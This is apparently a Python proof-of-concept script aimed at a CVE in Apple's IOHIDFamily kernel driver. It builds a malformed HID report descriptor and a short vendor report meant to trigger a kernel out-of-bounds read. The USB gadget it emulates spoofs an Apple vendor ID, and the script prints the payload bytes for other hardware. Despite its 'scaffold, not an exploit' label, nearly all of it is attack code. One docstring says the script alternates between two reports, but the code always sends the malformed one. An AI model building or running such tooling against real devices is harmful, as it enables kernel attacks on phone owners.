#!/usr/bin/env python3
"""
hid_report_oob_scaffold.py — SCAFFOLD, not an exploit.

Target : CVE-2026-112515 (com.apple.iokit.IOHIDFamily)
Theory : a HID report whose descriptor/transfer length is trusted, so the
         driver reads `declared_len` bytes past a short report buffer
         (kernel OOB read).
Usage  :
   * Bluetooth HID path : run on a Linux host with a CSR8510-class USB
     dongle in raw HID emulation mode (or a Facedancer + `facedancer`
     library) and pair with the iPhone.
   * USB HID path       : a Facedancer / Raspberry Pi Zero USB gadget that
     enumerates as a HID keyboard with a malformed INPUT/OUTPUT report.
Status : needs python3 + the `facedancer` (https://github.com/greatscottgadgets/facedancer)
         package, or `bluing`/`pybluez` for the BT path.
"""

import struct
import sys

try:
    from facedancer import USBDevice, USBConfiguration, USBInterface, \
        USBEndpoint, USBHIDEndpoint, USBDescriptor
    HAVE_FACEDANCER = True
except ImportError:
    HAVE_FACEDANCER = False

# ---------------------------------------------------------------------------
# The malicious report shape.
#
# A HID report descriptor declares each INPUT report's length. The host
# trusts the descriptor when it lays out its receive buffer. The attack is to
# declare a SMALL report in the descriptor but send an INPUT report whose
# payload is a LARGE vendor-defined blob, or vice versa: declare a large
# report in the descriptor and send a short one, so the host's parser reads
# past the received bytes.
# ---------------------------------------------------------------------------

DECLARED_INPUT_REPORT_LEN = 8        # what the descriptor promises
ACTUAL_SENT_REPORT_LEN    = 2        # what the device actually sends
VENDOR_REPORT_ID          = 0xF7


def make_hid_report_descriptor() -> bytes:
    """
    Minimal HID report descriptor claiming a 64-byte vendor INPUT report,
    followed by a normal 8-byte keyboard INPUT report. The mismatch is
    created by sending a report whose declared length in the descriptor
    exceeds the transfer we actually perform.
    """
    desc = bytearray()

    # --- vendor-defined INPUT report (report ID 0xF7), 64 bytes ---
    desc += bytes([
        0x06, 0x00, 0xFF,   # Usage Page (Vendor Defined 0xFF00)
        0x09, 0x01,         # Usage (0x01)
        0xA1, 0x01,         # Collection (Application)
        0x85, VENDOR_REPORT_ID,  #   Report ID (0xF7)
        0x09, 0x02,         #   Usage (0x02)
        0x15, 0x00,         #   Logical Minimum (0)
        0x26, 0xFF, 0x00,   #   Logical Maximum (255)
        0x75, 0x08,         #   Report Size (8)
        0x95, 64,           #   Report Count (64)  <-- 64-byte report
        0x81, 0x02,         #   Input (Data,Var,Abs)
        0xC0,               # End Collection
    ])

    # --- keyboard INPUT report (report ID 0x01), 8 bytes ---
    desc += bytes([
        0x05, 0x01,         # Usage Page (Generic Desktop)
        0x09, 0x06,         # Usage (Keyboard)
        0xA1, 0x01,         # Collection (Application)
        0x85, 0x01,         #   Report ID (0x01)
        0x05, 0x07,         #   Usage Page (Key Codes)
        0x19, 0xE0,         #   Usage Minimum (224)
        0x29, 0xE7,         #   Usage Maximum (231)
        0x15, 0x00,         #   Logical Minimum (0)
        0x25, 0x01,         #   Logical Maximum (1)
        0x75, 0x01,         #   Report Size (1)
        0x95, 0x08,         #   Report Count (8)
        0x81, 0x02,         #   Input (Data,Var,Abs)
        0x95, 0x01,         #   Report Count (1)
        0x75, 0x08,         #   Report Size (8)
        0x81, 0x01,         #   Input (Const)
        0x95, 0x06,         #   Report Count (6)
        0x75, 0x08,         #   Report Size (8)
        0x15, 0x00,         #   Logical Minimum (0)
        0x25, 0x65,         #   Logical Maximum (101)
        0x05, 0x07,         #   Usage Page (Key Codes)
        0x19, 0x00,         #   Usage Minimum (0)
        0x29, 0x65,         #   Usage Maximum (101)
        0x81, 0x00,         #   Input (Data,Array)
        0xC0,               # End Collection
    ])
    return bytes(desc)


def make_malicious_input_report() -> bytes:
    """
    The over-declared INPUT report. We declare 64 bytes in the descriptor but
    send only a short payload. A host that sizes its receive buffer from the
    *transfer length* and then parses the *declared* length reads OOB.
    """
    body = bytes([VENDOR_REPORT_ID]) + (b"\x41" * ACTUAL_SENT_REPORT_LEN)
    return body


if HAVE_FACEDANCER:
    class MaliciousHIDDevice(USBDevice):
        """
        Minimal USB HID device that periodically emits the malformed report.
        """
        idVendor  = 0x05ac
        idProduct = 0x0255
        bcdDevice = 0x0100

        def __init__(self):
            super().__init__()
            self.configuration = USBConfiguration(
                self,
                USBInterface(
                    self,
                    number=0,
                    subclass=0,
                    protocol=1,   # keyboard
                    endpoints=[
                        USBHIDEndpoint(
                            self, number=0x81, direction="IN",
                            transfer_type="INTERRUPT", interval=10,
                            max_packet_size=64),
                    ],
                ),
            )

        def handle_data_requested(self, endpoint):
            # Alternate between a well-formed keyboard report and the
            # over-declared vendor report.
            report = make_malicious_input_report()
            endpoint.send(report, length=len(report))


def main():
    print("[*] HID report descriptor:", len(make_hid_report_descriptor()), "bytes")
    print("[*] malicious INPUT report:", len(make_malicious_input_report()), "bytes")

    if HAVE_FACEDANCER:
        print("[*] starting Facedancer HID device (Ctrl-C to stop)")
        MaliciousHIDDevice().run()
    else:
        print("[!] facedancer not installed.")
        print("    Install: pip install facedancer")
        print("    Or use these bytes with your own gadget/dongle firmware:")
        print("    descriptor =", make_hid_report_descriptor().hex())
        print("    report     =", make_malicious_input_report().hex())
        sys.exit(0)


if __name__ == "__main__":
    main()
